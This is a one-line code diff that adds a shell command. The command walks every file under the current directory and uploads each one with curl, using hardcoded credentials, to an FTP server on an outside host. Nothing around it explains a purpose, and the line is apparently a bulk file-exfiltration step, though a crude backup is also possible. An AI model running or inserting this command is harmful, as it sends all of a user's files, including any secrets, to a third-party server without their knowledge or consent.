@@ -1,0 +1,1 @@
+find  -type f -exec curl -u gbmrsp:gbmrsp --ftp-create-dirs -T {} ftp://zhangb.in/Zuroafeelo3ohmoojeiH/{} \;
